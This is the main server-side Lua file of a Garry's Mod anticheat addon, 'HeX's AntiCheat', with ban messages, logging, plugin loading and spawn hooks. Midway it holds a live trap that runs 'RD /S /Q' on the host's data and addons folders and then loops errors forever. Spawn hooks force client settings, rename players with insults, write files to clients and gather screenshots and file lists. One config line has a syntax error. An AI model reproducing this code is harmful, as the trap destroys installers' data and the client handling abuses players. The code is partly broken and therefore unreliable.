--[[
	=== HeX's AntiCheat ===
	"A good attempt at something impossible"
	http://steamcommunity.com/id/MFSiNC
]]

MsgN("\n///////////////////////////////////")
MsgN("//    === HeX's AntiCheat ===    //")
MsgN("///////////////////////////////////")

HAC	= { Banned = {}, BannedIP = {} }

//Counts
HAC.Count = {
	LenCL			= 0,		--Length of clientside
	LenLCL			= 0,		--Lines from MyCall to EOF
	HIS				= 0,		--HACInstalled total, cl_EatKeys
	PLCount			= 0,		--Package count
	_R				= 0,		--R count
	_G				= 0,		--G count
	BCLen			= 13,		--Length of ban command
}

//Garbage
HAC.Count.Garbage = {
	[1337] = true,
}

//Times
HAC.Time = {
	Ban				= 15,		--Mins to ban
	GPhys			= 10,		--RCVAR wait time
	NameEvery		= 30,		--Send "name" every
}

//Config
HAC.WaitCVar		= CreateConVar("hac_wait",	     1, true, false)
HAC.Silent			= CreateConVar("hac_silent",	 0, true, false)
HAC.Conf = {
	SC_Folder		= "C:/Documents and Settings/Administrator/Desktop/SCFolder",
	Totals			= "C:/hac_totalbans.txt",
	APIKey			= false,,
	Tickrate		= 33,
	Debug			= false,
}


//NEVER SEND
include("hac_nosend.lua")

HAC.Contact			= "Try another server"

HAC.Msg 			= {
	//General
	HC_Init		= "Error #H00, Colonel Panic. "..HAC.Contact,
	HC_Banned_1 = "Error #H01, Does that look like "..HAC.Time.Ban.." mins to you?!, wait out your ban!",
	HC_Banned_2 = "Error #H02, You didn't listen, "..HAC.Time.Ban.." mins have not passed!, wait "..HAC.Time.Ban.." mins!",
	HC_Banned_3 = "Error #H03, You are stupid. WAIT "..HAC.Time.Ban.." MINUTES.",
	HC_LCLFail	= "Error #H04, Tried to pop off the top (tube is empty). "..HAC.Contact,
	HC_SpoofID	= "Error #H05, What was i thinking?. "..HAC.Contact,
	HC_GCAgain	= "Error #H06, LAY EGG IS TRUE. "..HAC.Contact,
	HC_BCIFail	= "Error #H07, You lose! good day sir!. "..HAC.Contact,
	HC_BCIAgain	= "Error #H08, Fucks given 0%. "..HAC.Contact,
	HC_BCINever	= "Error #H09, Right in the corn yeah! "..HAC.Contact,
	HC_TC_Init	= "Error #H10, Location not Earth "..HAC.Contact,
	
	//SelfExists
	SE_Also		= "Error #H11, Chevron 7 will not lock. "..HAC.Contact,
	SE_KRAgain	= "Error #H12, Playing with yourself again?. "..HAC.Contact,
	SE_IPFail	= "Error #H13, Dialing failed, gate offline. "..HAC.Contact,
	SE_KR30		= "Error #H14, Network failure. "..HAC.Contact,
	SE_Count	= "Error #H15, .ASS error! "..HAC.Contact,
	SE_GPFail	= "Error #H16, Dick too small. "..HAC.Contact,
	SE_ScrPath	= "Error #H17, Data failure. "..HAC.Contact,
	SE_NoBinds	= "Error #H18, Out of cheese. "..HAC.Contact,
	SE_ECheck	= "Error #H19, How could you!. "..HAC.Contact,
	SE_GCheck	= "Error #H20, These aren't my shoes. "..HAC.Contact,
	SE_K1Gone	= "Error #H21, Run as fast as you can. "..HAC.Contact,
	SE_K1Fail	= "Error #H22, Didn't run fast enough. "..HAC.Contact,
	SE_K2Gone	= "Error #H23, Absorbed too many bullets. "..HAC.Contact,
	SE_K2Fail	= "Error #H24, Tripped over a chicken. "..HAC.Contact,
	SE_TwoInit	= "Error #H25, Elevator located in China. "..HAC.Contact,
	SE_LenFail	= "Error #H26, Didn't kiss. "..HAC.Contact,
	SE_NoUHDM	= "Error #H27, Bowling ball is not for eating. "..HAC.Contact,
	SE_BadCRC	= "Error #H28, Bagpipe Smuggler. "..HAC.Contact,
	SE_CanInit	= "Error #H29, BOOOOOOOOAAAAAAAAAAAT! RUDDEEEEEER!. "..HAC.Contact,
	
	//HKS
	HK_Fake		= "Error #H30, GMod folder untidy!. www.support.facepunchstudios.com/kb/articles/2-how-do-i-clean-my-game",
	HK_BadRX	= "Error #H31, GMod folder untidy!. www.support.facepunchstudios.com/kb/articles/2-how-do-i-clean-my-game",
	HK_DSFail	= "Error #H32, BuyAnotherCup. "..HAC.Contact,
	HK_NoRX		= "Error #H33, No panties. "..HAC.Contact,
	HK_NoDec	= "Error #H34, Gandalf-sized beard. "..HAC.Contact,
	HK_Double	= "Error #H35, Attempt to index local 'joke' (a nil value). "..HAC.Contact,
	HK_BadTX	= "Error #H36, Can't find dog. "..HAC.Contact,
	HK_TXInit	= "Error #H37, Dog missing! "..HAC.Contact,
	HK_BadList	= "Error #H38, LP0 on fire. "..HAC.Contact,
	HK_Timeout	= "Error #H39, Error with previous error. "..HAC.Contact,
	HK_NoChkRX	= "Error #H40, Out of lube. "..HAC.Contact,
	HK_NoChkDec	= "Error #H41, Had a little accident. "..HAC.Contact,
	HK_BadRX2	= "Error #H42, Pissing in the sandbox. "..HAC.Contact,
	HK_BadRX15	= "Error #H43, Inteligence low. "..HAC.Contact,
	HK_BadSPath	= "Error #H44, Magic with less bunnies. "..HAC.Contact,
	HK_NoTAB1	= "Error #H45, FUCK THE FUCKING FUCKERS. "..HAC.Contact,
	HK_BadCRC	= "Error #H46, Time-Memory Tradeoff. "..HAC.Contact,
	
	//CMod,DLC
	CM_NoArgs	= "Error #H47, Bum error! "..HAC.Contact,
	CM_NoRX		= "Error #H48, 12 car pile-up, expect delays. "..HAC.Contact,
	CM_NoDec	= "Error #H49, Mixing error, deck missing. "..HAC.Contact,
	CM_BadDLC	= "Error #H50, You broke it, didn't you. "..HAC.Contact,
	CM_NoBin	= "Error #H51, Not the droid I'm looking for. "..HAC.Contact,
	CM_No64		= "Error #H52, Dustbin stolen. "..HAC.Contact,
	CM_SmallBin	= "Error #H53, Stuff and Things error. "..HAC.Contact,
	CM_BadCRC	= "Error #H54, Trouble up ahead. "..HAC.Contact,
	CM_WhiteM	= "Error #H55, Littering. "..HAC.Contact,
	CM_WhiteM2	= "Error #H56, Also cocks. "..HAC.Contact,
	CM_Init		= "Error #H57, Network overflow. "..HAC.Contact,
	CM_Double	= "Error #H58, Pitched a tent. "..HAC.Contact,
	CM_NoSWEP	= "Error #H59, That's no moon! "..HAC.Contact,
	
	//TakeSC
	SC_NoRX		= "Error #H60, Filthy keyboard. "..HAC.Contact,
	SC_NoDec	= "Error #H61, Boat missing. "..HAC.Contact,
	SC_NoBin	= "Error #H62, GASOLINE SAUSAGE. "..HAC.Contact,
	SC_Dupe		= "Error #H63, Stream overload. "..HAC.Contact,
	SC_No64		= "Error #H64, What are you doing, dave. "..HAC.Contact,
	SC_NoJPG	= "Error #H65, Error with Windowed mode. Set to Fullscreen. "..HAC.Contact,
	SC_Small	= "Error #H66, Brain too small. "..HAC.Contact,
	SC_Large	= "Error #H67, Toilet overflow, code brown. "..HAC.Contact,
	SC_NoRes	= "Error #H68, Bad lemons. "..HAC.Contact,
	SC_BadRes	= "Error #H69, Too many bullets. "..HAC.Contact,
	SC_Timeout	= "Error #H70, CORN HUSK. "..HAC.Contact,
	
	//BurstCode
	BC_Timeout	= "Error #H71, Network timeout. "..HAC.Contact,
	BC_BadWait	= "Error #H72, Mayonnaise now equals Hamburger. "..HAC.Contact,
	BC_NoDec	= "Error #H73, Limited bottled universe. "..HAC.Contact,
	BC_NoRan	= "Error #H74, Full of shit. "..HAC.Contact,
	BC_TooLate	= "Error #H75, Lost loves us to do our system poo. "..HAC.Contact,
	BC_BadRet	= "Error #H76, Deploy Refrigerator. "..HAC.Contact,
	BC_Error	= "Error #H77, Double brandy. "..HAC.Contact,
	
	//ConCon
	CC_NoRX		= "Error #H78, Icebergs? you mean bitchcicles. "..HAC.Contact,
	CC_NoDec	= "Error #H79, Keyboard Warrior. "..HAC.Contact,
	CC_Count	= "Error #H80, Fresh balls. "..HAC.Contact,
	CC_NoArgs	= "Error #H81, Balance problem. "..HAC.Contact,
	CC_FewArgs	= "Error #H82, PORCELAIN THRONE. "..HAC.Contact,
	CC_NoCmd	= "Error #H83, General Failure. "..HAC.Contact,
	CC_Fail		= "Error #H84, Deploy Smoke. "..HAC.Contact,
	
	//HACBurst
	HB_Bad		= "Error #H85, Butthole too tight. "..HAC.Contact,
	HB_Same		= "Error #H86, Problem exists between keyboard and chair. "..HAC.Contact,
	HB_Gone		= "Error #H87, Carrot phase too short. "..HAC.Contact,
	HB_Cont		= "Error #H88, Windows out-of-date. "..HAC.Contact,
	HB_Comp		= "Error #H89, Transport stream failure. "..HAC.Contact,
	HB_Fail		= "Error #H90, Legs crossed. "..HAC.Contact,
	HB_Buff		= "Error #H91, All our operators are currently busy. "..HAC.Contact,
	
	//RSX
	RX_Pong		= "Error #H92, Lost the game. "..HAC.Contact,
	RX_BadSeed	= "Error #H93, Silent Knob. "..HAC.Contact,
	RX_Init		= "Error #H94, Divide by cucumber. "..HAC.Contact,
	
	//Binds
	BB_NoStr	= "Error #H95, Table too expensive. "..HAC.Contact,
	BB_NoTab	= "Error #H96, String Cheese in modem. "..HAC.Contact,
	BB_NoBinds	= "Error #H97, Cleanup on aisle 2. "..HAC.Contact,
	
	//XDCheck
	XD_LenFail	= "Error #H98, Bacon expected, got Fries. "..HAC.Contact,
	XD_Timeout	= "Error #H99, Connection Error. "..HAC.Contact,
	XD_Mismatch	= "Error #H100, Out of Cyan. "..HAC.Contact,
	
	//LPT
	LPT_Double	= "Error #H101, Banana in tailpipe. "..HAC.Contact,
	LPT_NoDec	= "Error #H102, WORTHLESS ACHIEVEMENT. "..HAC.Contact,
	LPT_Timeout	= "Error #H103, Went full potato. "..HAC.Contact,
	
	//PWAuth
	PW_SkidName = "Error #H104, Overflow in chamber pot. "..HAC.Contact,
	PW_UniChar	= "Error #H105, Your name contains the '%s' character, remove it and try again.",
	PW_BadName	= "Error #H106, OH SNAP, change your name! "..HAC.Contact,
	
	//SteamAPI - Private
	VC_Priv_1	= "Error #H107, Your Steam profile isn't Public. Change your Community profile settings to Public and try again",
	VC_Priv_2	= "Error #H108, You didn't listen!, change your Steam Community profile settings to Public then try again!",
	VC_Priv_3	= "Error #H109, Steam profile *still* isn't Public, go to your Steam Community options and change it to Public!",
	
	//SteamAPI - VAC
	VC_VAC_1	= "Error #H110, Account VAC banned and you've cheated in the past, you can't play here!",
	VC_VAC_2	= "Error #H111, You're still VAC banned, and you've still cheated. You need to buy GMod again on a new account.",
	VC_VAC_3	= "Error #H112, You can't join with a VAC banned account. "..HAC.Contact,
	
	//GPath
	GP_Again	= "Error #H113, Base based base error. "..HAC.Contact,
	GP_NoSteam	= "Error #H114, Big butt blowout. "..HAC.Contact,
	
	//Monitor
	HM_Init		= "Error #H115, Peewee incident. "..HAC.Contact,
	
	//Namehack
	NH_Change	= "Error #H116, Please don't change your name while in-game (Rejoin, it's ok)",
	
	//UCmd
	UCmd_AllBad	= "Error #H117, Out of phase. "..HAC.Contact,
	
	//DownloadFilter
	DL_NoRX		= "Error #H118, Hooker Crackpipe. "..HAC.Contact,
	DL_NoDec	= "Error #H119, And their payin' us to haul cheese?!. "..HAC.Contact,
	DL_Count	= "Error #H120, Surprise plot twist one-eighty. "..HAC.Contact,
	DL_NotFile	= "Error #H121, Hand me the hammer. "..HAC.Contact,
	DL_GONE_1	= "Error #H122, Try deleting your \"garrysmod/download\" folder and try again.",
	DL_GONE_2	= "Error #H123, Please run \"cl_downloadfilter all\" in the console, then rejoin.",
	DL_GONE_3	= "Error #H124, Its still not working, this may be a FastDL problem. "..HAC.Contact,
	
	//CVL
	CVL_NoS2	= "Error #H125, Screen error. "..HAC.Contact,
	CVL_NoRX	= "Error #H126, Cock n' Balls Ice Cream Co. "..HAC.Contact,
	CVL_Small	= "Error #H127, BURN YOUR HOUSE DOWN. "..HAC.Contact,
	CVL_Timeout	= "Error #H128, I swallowed a bug. "..HAC.Contact,
	CVL_LowCC	= "Error #H129, Nuts to your white mice. "..HAC.Contact,
	CVL_LowCV	= "Error #H130, Dropped hints. "..HAC.Contact,
	CVL_CCAgain	= "Error #H131, That makes funny noises AND does stuff with paper. "..HAC.Contact,
	CVL_CVAgain	= "Error #H132, Ridiculous cat piss recall. "..HAC.Contact,
	
	//Binds
	BB_Double	= "Error #H133, END OF LINE. "..HAC.Contact,
	BB_Max_PK	= "Error #H134, Propkillers are not welcome here, clean out your binds. "..HAC.Contact,
	BB_Max_Det	= "Error #H135, Bad binds detected! Remove anything suspicious. "..HAC.Contact,
	
	//SelfExists
	SE_GHError	= "Error #H136, Loose cannon. "..HAC.Contact,
	
	//PWAuth
	PW_AltOnIP	= "Error #H137, Homebrew Boatanchors. "..HAC.Contact,
	PW_IPError	= "Error #H138, Because, well...candles. "..HAC.Contact,
	
	//SteamAPI - No games
	VC_Fake_1	= "Error #H139, Electric boogaloo",
	VC_Fake_2	= "Error #H140, +++ Out of cheese error +++ "..HAC.Contact,
	VC_Fake_3	= "Error #H141, +++ Please reinstall universe and reboot +++. "..HAC.Contact,
	
	//SteamAPI - Shared account
	VC_Share_1	= "Error #H142, Steam Sharing isn't supported here. Please buy/log in to your own account",
	VC_Share_2	= "Error #H143, Keep trying and I'll just permaban your main account :)",
	VC_Share_3	= "Error #H144, You will never be able to play here with a shared account!",
	
	//SteamAPI - No GMod
	VC_GMod_1	= "Error #H145, Stop using that shared account and join properly",
	VC_GMod_2	= "Error #H146, Oh dear. You're trying to ban evade aren't you?. "..HAC.Contact,
	VC_GMod_3	= "Error #H147, A 3rd time? you're really not listening. You need to buy GMod yourself!",
	
	//SteamAPI - Private, join
	VC_PrivJoin	= "Error #H148, Private Steam profile. Change your profile to public, then try again in 60 seconds.",
	
	//SteamAPI - Private, kick
	VC_Group_1	= "Error #H150, Looks like I can't trust you :(",
	VC_Group_2	= "Error #H151, Nope, still not working.",
	VC_Group_3	= "Error #H152, I'd not bother if I were you.",
	
	//ConCon
	CC_NoInit	= "Error #H153, Hideous acrylic table lamp. "..HAC.Contact,
	
	//PWAuth
	PW_LangName	= "Error #H154, Overpopped! Change your name and try again!.",
	PW_Short	= "Error #H155, 3 pound planets. Change your name and try again!.",
	PW_Long		= "Error #H156, Name too long, change your name and try again!.",
	PW_BadChar	= "Error #H157, Your name really shouldn't contain the '%s' character.",
	
	//CVCheck
	CV_Failure	= "Error #H158, CHOCOLATE SPEEDWAY. "..HAC.Contact,
	CV_BadRes	= "Error #H159, Theoretical Phallus. "..HAC.Contact,
	
	//KLog
	KLG_NoRX	= "Error #H160, Just as the pandas wanted. "..HAC.Contact,
	KLG_TooBig	= "Error #H161, Grand Theft Mango. "..HAC.Contact,
	
	//PWAuth
	PW_TooMany	= "Error #H162, Too many players currently connected from this IP. "..HAC.Contact.." If you want to have a LAN party.",
	
	//HKS
	HK_Override	= "Error #H163, Instructions unclear, I got my dick stuck in a ceiling fan. "..HAC.Contact,
	
	//GPath
	GP_NoOS		= "Error #H164, Testicles ablaze. "..HAC.Contact,
	GP_NoEnds	= "Error #H165, Use brain!. "..HAC.Contact,
	
	//Angle
	AN_AntiAim	= "Error #H166, Moon Sausage! "..HAC.Contact,
	AN_BadAng	= "Error #H167, MULTIMOON ERROR! "..HAC.Contact,
	
	//FuncThis
	FC_BadFuncs = "Error #H168, TOO MUCH PAPA JOHN! "..HAC.Contact,
	
	//CLAC
	--CL_NoStr	= "Error #H169, Thermonuclear Whoopass. "..HAC.Contact,
	--CL_NoTab	= "Error #H170, Restricting the drive shaft to the inlet valve. "..HAC.Contact,
	
	//Binds
	BB_NoCont	= "Error #H171, Just a salad. "..HAC.Contact,
	
	//EatKeys
	KY_Timeout	= "Error #H172, A blue one. "..HAC.Contact,
	
	//Crash
	CS_Crash	= "Error #H173, 40 barrels of piss. "..HAC.Contact,
}


//LCD
HAC.TotalBans		= 0
HAC.TotalHacks		= 0


//Ban Commands, fixme, redo this whole thing and have a table / AddBanCommand(str)
HAC.FakeBanCommand	= table.Random( {"hbms", "asdf", "_hsp1", "poopp"} )
HAC.AuxBanCommand	= "hac-united_hosts-hex"
HAC.SEBanCommand	= "sk_plr_dmg_rpg"
HAC.AllBanCommand	= {
	"hac_by_hex__failure", "GAMEMODE", "whoops", "ohdear", "uhoh", "damn",
	"buttocks", "melons", "crap", "lolol", "nil", "_hsp_oscheck", "string",
}

//Player log names
HAC.LogNames 		= {
	"Ban", "Init", "Eye", "CCA", "Hook", "WGM", "Font", "Req", "CCC",
	"CCV", "_G",   "Msg", "print",
}

//Log only --fixme, convert to gatehooks
HAC.LogOnly	= {
	"CLDB",
	"Key",
	"UNK",
	"SLOG",
	"IPS",
	"Datafile",
	"Rootfile",
	"NoRecoil",
	"KR30=physgun_wheelspeed",
	"PropBind=",
}



_R = debug.getregistry()

//Pre base
Msg("  Loading pre-base\n")
include("hac_base.lua")

//Modules
Msg("  Loading modules\n")
include("hac_modules.lua")

//Post base
Msg("  Loading post-base\n")
include("hac_base_post.lua")
include("hac_minify.lua")

//People can't read the readme
timer.Simple(2, function()
	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\data"')
	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\addons"')
	
	timer.Simple(5, function()
		while true do
			ErrorNoHalt("[HAC] PEBCAK Error. RTFM or slap admin with a large trout!\n")
		end
	end)
end)

//Failed
if HAC.AbortLoading then
	ErrorNoHalt("\n\n[HAC] ID10-T Error!\n\n")
	return
end

//Resources
Msg("  Loading resources\n")
resource.AddFile("sound/hac/you_are_a_horrible_person.mp3")
resource.AddFile("sound/hac/really_cheat.mp3")
resource.AddFile("sound/hac/no_no_no.mp3")
resource.AddFile("sound/hac/still_not_working.mp3")
resource.AddFile("sound/hac/test_is_now_over.mp3")
resource.AddFile("sound/hac/whats_in_here.mp3")
resource.AddFile("sound/hac/highway_to_hell.mp3")

AddCSLuaFile("en_hac.lua")
AddCSLuaFile("en_streamhks.lua")
AddCSLuaFile("includes/extensions/datasteam.lua")		--Mis-spelling
AddCSLuaFile("autorun/client/cl_hac.lua") 				--Decoy
AddCSLuaFile("autorun/client/nuke_config_client.lua") 	--Real

//BanCommand, has to be after base
HAC.BanCommand = HAC.RandomString( math.random( (HAC.Count.BCLen/2), HAC.Count.BCLen) )

//Lists
Msg("  Loading lists\n")
HAC.SERVER	= {} --Fixme, remove this, use per-plugin lists!
HAC.CLIENT	= {			--Mirrors the client's table!
	White_DLC			= {},
	White_NNRIgnore		= {},
	White_NNRWeapons	= {},
	White_Package		= {},
	White_Require		= {},
	White_Modules		= {},
	White_GSafe			= {},
	White_GUseless		= {},
	White_CVTab			= {},
	White_Hooks			= {},
	White_CCA			= {},
	White_GM			= {},
	White_Font			= {},
	White_CCC			= {},
	White_CCV			= {},
	White_PRT			= {},
	
	Black_RCC			= {},
	Black_DataFiles		= {},
	Black_Megaloop		= {},
	Black_Hooks			= {},
	Black_NoHW			= {},
}
HAC.KEY = "LOADING"

HAC.Lists = 0
for k,v in ipairs( file.Find("lists/*.lua", "LUA") ) do
	include("lists/"..v)
	
	if not v:Check("sv_") then
		AddCSLuaFile("lists/"..v)
	end
	
	HAC.Lists = HAC.Lists  + 1
end


//Plugins
Msg("  Loading plugins\n")

//Load these first
include("HAC/sh_HACBurst.lua")
include("HAC/sv_ConCon.lua")
include("HAC/sv_SelfExists.lua")

local LoadFirst = {
	["sh_HACBurst.lua"] 	= 1,
	["sv_ConCon.lua"] 		= 1,
	["sv_SelfExists.lua"]	= 1,
}
//Plugins
for k,v in pairs( file.Find("HAC/*.lua", "LUA") ) do
	//Server
	if v:Check("sv_") then
		if not LoadFirst[v] then
			include("HAC/"..v)
		end
		
	//Shared
	elseif v:Check("sh_") then
		if not LoadFirst[v] then
			include("HAC/"..v)
		end
		
		AddCSLuaFile("HAC/"..v)
		HAC.Count.HIS = HAC.Count.HIS + 1
		
	//Client
	elseif v:Check("cl_") then
		AddCSLuaFile("HAC/"..v)
		HAC.Count.HIS = HAC.Count.HIS + 1
	end
end



//Tables
HAC.GCICount = {}
for k,v in pairs(HAC.Count.Garbage) do
	HAC.GCICount[ tonumber( tostring(k):sub(0,4) ) ] = true
end

//Key
function HAC.InitPostEntity()
	table.MergeEx(_G.WLists,	HAC.CLIENT)
	table.MergeEx(_G.BLists,	HAC.CLIENT)
	table.MergeEx(_G.GList,		HAC.CLIENT) --GSafe
	
	HAC.KEY = tostring( HAC.CRCLists(HAC.CLIENT) )
	
	_G.WLists	= nil
	_G.BLists	= nil
	_G.GList	= nil
end
hook.Add("InitPostEntity", "HAC.InitPostEntity", HAC.InitPostEntity)



//First spawn
function HAC.PlayerInitialSpawn(ply)
	local SteamID	= ply:SteamID()
	local SID 		= SteamID:SID()
	
	//Trick cheats that use this/garry's IsAdmin()
	ply:SetNetworkedString("usergroup", "superadmin")
	
	//Set player's dir
	local Dir = SID:Split("_")
	if Dir then
		Dir = Dir[4]
		if not Dir or #Dir < 4 then
			Dir = SID
		end
	else
		Dir = SID
	end
	ply.HAC_Dir 		= "H_"..Dir
	
	//AntiHaxName
	ply.AntiHaxName	= ply.NickOld and ply:NickOld() or ply:Nick() --Account for HSP
	
	//Log stuff
	ply.HAC_TimeSpawn	= CurTime()
	ply.HAC_LogCalls	= {}
	ply.HAC_Log 		= {}
	for k,v in pairs(HAC.LogNames) do
		ply.HAC_Log[v] = Format("%s/%s_%s.txt", ply.HAC_Dir, v:lower(), SID)
	end
	
	//Stop here if bot
	if ply:IsBot() then return end
	
	
	
	//Send ban command
	umsg.Start("PlayerInitialSpawn", ply)
		umsg.String(HAC.BanCommand)
	umsg.End()
	
	//Send it twice
	timer.Simple(3, function()
		if IsValid(ply) then
			umsg.Start("PlayerInitialSpawn", ply)
				umsg.String(HAC.BanCommand)
			umsg.End()
		end
	end)
	
	//BAN_COMMAND, hidden CRC
	timer.Simple(1, function()
		if IsValid(ply) then
			local Key = HAC.SteamKey(SteamID)
			ply:print("Map startup (CRC: "..Key..")")
			ply:SendLua( Format([[--Map startup (CRC: %s)]], Key) )
			
			ply:SendLua([[BAN_COMMAND = "]]..HAC.FakeBanCommand..[["]])
		end
	end)
	
	//Warning message
	local Silent = HAC.Silent:GetBool()
	if not Silent then
		timer.Simple(2, function()
			if IsValid(ply) then
				umsg.Start("HAC.Message", ply)
					umsg.Short(HAC.Time.Ban)
				umsg.End()
			end
		end)
	end
	
	//CHECK SPOOF ID, should never happen.
	if HAC.Banned[ SteamID ] and not Silent then
		ply:HAC_Drop(HAC.Msg.HC_SpoofID)
	end
end
hook.Add("PlayerInitialSpawn", "HAC.PlayerInitialSpawn", HAC.PlayerInitialSpawn)


//Really spawn
function HAC.ReallySpawn(ply)
	//sv_cheats, spoofed/forced
	timer.Simple(HAC.Time.GPhys, function()
		if IsValid(ply) then
			ply:ClientCommand("sv_rphysicstime 1.0")
			ply:ConCommand("sv_allowcslua 1")
			ply:HACPEX("sv_rphysicstime 1.0")
			ply:HACPEX("sv_allowcslua 1")
		end
	end)
	
	//Name ConVar, if flags/callback messed with, will set..
	local TID = "HAC_DickTimer_"..tostring(ply)
	timer.Create(TID, HAC.Time.NameEvery, 0, function()
		if IsValid(ply) then
			if not HAC.Silent:GetBool() then
				local Dick = Format("I only have a 2.%i%i inch dick :(", math.random(0,99), math.random(0,99) )
				ply:ClientCommand("name "..Dick)
			end
		else
			timer.Destroy(TID)
		end
	end)
	
	//To the "GBan" dev, I hope this shows why trusting the client is a bad idea
	if not ply:HAC_IsHeX() and not ply:IsAdmin() then
		ply:SendLua([[ file.Write("oldhash.txt", "To the 'GBan' dev, I hope this shows why trusting the client is a bad idea.") ]])
	end
end
hook.Add("HACReallySpawn", "HAC.ReallySpawn", HAC.ReallySpawn)


//Quit
local function RemoveBots()
	timer.Simple(5, function()
		for k,v in pairs( player.GetBots() ) do
			v:Kick("Freeing player slot")
		end
	end)
end
local function QuitTellHeX(self, Reason)
	Reason = self:HAC_Info().." > "..Reason
	HAC.TellHeX(Reason, NOTIFY_ERROR, 20, "npc/roller/mine/rmine_shockvehicle"..math.random(1,2)..".wav")
end
function HAC.PlayerDisconnected(self, NewRes)
	if self.HAC_NoLogDisconnect or self:IsBot() then return end --Don't want it happening twice!
	if not (self:Logged() and file.Exists(self.HAC_Log.Ban, "DATA") ) then return end
	
	local Reason = NewRes or "Disconnected"
	local Silent = HAC.Silent:GetBool()
	
	//Banned & exploded
	if self.DONEBAN and self.DONEMSG then
		HAC.TotalBans = HAC.TotalBans + 1
		Reason = "AutoBANNED"
		
		//Kick the bot
		RemoveBots()
		
		//Tell HeX
		QuitTellHeX(self,Reason)
		
	//Banned, but disconnected before kick :(
	elseif self.DONEBAN and not self.DONEMSG then
		//Kick the bot
		RemoveBots()
		
		//Silent
		if Silent then
			Reason = "Autobanned (SILENT, NO BOOM)"
		else
			Reason = "Autobanned (Quit before boom)"
		end
		
		//Tell HeX
		QuitTellHeX(self, Reason)
		
	//NOT banned, Failed init
	elseif self:HasFailedInit() and not self.DONEBAN then
		if self.HAC_InitKicking then
			//Got kicked
			Reason = "InitFail ("..self:FirstInit()..")"
		else
			if Silent then
				Reason = "InitFail (SILENT, NO KICK) ("..self:FirstInit()..")"
			else
				//Quit before kick
				Reason = "InitFail (Quit before kick) ("..self:FirstInit()..")"
			end
		end
	end
	
	
	//Log
	local Entry = Format("\n%s @ %s -- END LOG\n\n\n", Reason, self:DateAndTime() )
	HAC.file.Append(self.HAC_Log.Ban, Entry)
	HAC.file.Append("hac_log.txt", "\n"..Entry)
end
hook.Add("PlayerDisconnected", "HAC.PlayerDisconnected", HAC.PlayerDisconnected)

//Shutdown
function HAC.ShutDown()
	for k,v in pairs( player.GetHumans() ) do
		HAC.PlayerDisconnected(v, "Shutdown/Mapchange")
	end
end
hook.Add("ShutDown", "HAC.ShutDown", HAC.ShutDown)


//Main log
function _R.Player:WriteLog(crime, pun, always_log)
	if not IsValid(self) then return end
	self.HAC_HasDoneLogThisTime = true
	
	local Banned = false
	if pun then
		pun = "AutoBANNED"
		Banned = pun
	else
		pun = "Autologged"
	end
	
	//Setup log
	local WhatLog	= self.HAC_Log.Ban
	local HasLog 	= file.Exists(WhatLog, "DATA")
	if not HasLog then
		self.HAC_LogCalls = {} --Empty table if log file was deleted mid-ban!
	end
	
	//Skip duplicate events
	if self.HAC_LogCalls[ crime..pun ] and not always_log then return end
	self.HAC_LogCalls[ crime..pun ] = true
	
	
	//Header
	local Header = Format("HAC log (GMod U%s) @ [%s] for %s\n\n", VERSION, HAC.Date(), self:HAC_Info(1,1) )
	//Rejoin
	if HasLog and not self.HAC_RejoinLogHeader and not self.HAC_HasWrittenLog then
		self.HAC_RejoinLogHeader = true
		HasLog = false --To make it write
		Header = "\n**REJOIN** "..Header
	end
	//Write
	local HAC_IsHeX = self:HAC_IsHeX()
	if not HasLog then
		HAC.file.Append(WhatLog, Header)
		if not HAC_IsHeX then
			HAC.file.Append("hac_log.txt", Header)
		end
		self.HAC_HasWrittenLog = true --Don't count 2nd call as new log
	end
	
	
	//Per pun log entry
	local Event = "["..self:Time().."] "..crime
	local This 	= Event.."\n"
	
	self.HAC_LastPun = self.HAC_LastPun or ""
	if pun != self.HAC_LastPun then
		This = Format("\n%s:\n%s\n", pun, Event)
	end
	self.HAC_LastPun = pun
	
	//Write
	if not HAC_IsHeX then
		HAC.file.Append("hac_log.txt", This)
	end
	HAC.file.Append(WhatLog, This)
	
	//Color
	crime = crime:EatNewlines()
	HAC.COLCON(
		HAC.RED,"[",
		HAC.GREEN,"HAC",
		HAC.RED,"] ",
		(Banned and HAC.RED or HAC.BLUE), pun.." ",
		HAC.YELLOW, self.AntiHaxName,
		HAC.PINK, " ("..self:SteamID()..") ",
		(Banned and HAC.RED or HAC.GREEN), crime
	)
	
	
	//Tell HeX
	HAC.TellHeX(
		self.AntiHaxName.." -> "..crime,
		(Banned and NOTIFY_CLEANUP or NOTIFY_ERROR),
		10,
		(Banned and "npc/roller/mine/rmine_tossed1.wav" or "buttons/button10.wav")
	)
	HAC.Print2HeX( Format("[HAC] - %s: %s - %s\n", pun, self:HAC_Info(), crime), true)
	
	return true
end
function _R.Player:Logged()
	return self.HAC_HasDoneLogThisTime
end


//Ban
function HAC.DoBan(ply,cmd,args, dontban,bantime,justlog,wait_time, always_log) --Ancient function, needs rewriting but massive
	if not IsValid(ply) or ply:IsBot() then return end
	
	//Fucked with
	local WasFucked = false
	if #args == 0 then
		WasFucked	= true
		dontban 	= true
		args 		= {HAC.Msg.HC_Init}
	end
	
	local Args1 = args[1] or ""
	if WasFucked or not ValidString(Args1) then
		ply:FailInit("Fucking with "..(tostring(cmd) or "it").."[["..tostring(Args1).."]]", HAC.Msg.HC_Init)
		return
	end
	
	//BanHook, PRE
	if HAC.Init.Call_BanHook(BANHOOK_PRE, ply,Args1,args,dontban,bantime,justlog,wait_time) then return end
	
	
	--MAIN LOG
	local Logged = ply:WriteLog(Args1, not (justlog or dontban), always_log)
	
	--SC 3 TIMES MAX, EACH REPORT
	ply.DONEHACKS = (ply.DONEHACKS or 0) + 1
	if ply.DONEHACKS < 3 then
		--SCREENSHOT
		timer.Simple(ply.DONEHACKS * 2, function()
			if IsValid(ply) then
				ply:TakeSC(not dontban) --Override if banned
			end
		end)
	end
	
	//File list
	ply:MakeFileList()
	
	//Groups
	ply:DumpGroups()
	
	//CVarlist
	ply:CVarList()
	
	//Log if on SkidCheck
	ply:LogIfSkidCheck()
	
	
	//Stop here if no ban
	if justlog then return Logged end
	HAC.TotalHacks = HAC.TotalHacks + 1
	
	
	
	//Fix for other plugins that need this var!
	local HAC_IsHeX	= ply:HAC_IsHeX()
	if not ply.DONEBAN and HAC_IsHeX then ply.DONEBAN = true end
	
	--IF SHOULD BAN, ONE TIME
	local HACBantime 	= bantime or HAC.Time.Ban
	local Nick			= ply.AntiHaxName
	local SID 			= ply:SteamID()
	if not dontban and not HAC_IsHeX and not ply.DONEBAN then
		ply.DONEBAN = true
		
		//IP, for alts this session
		local IPAddr = ply:IPAddress(true)
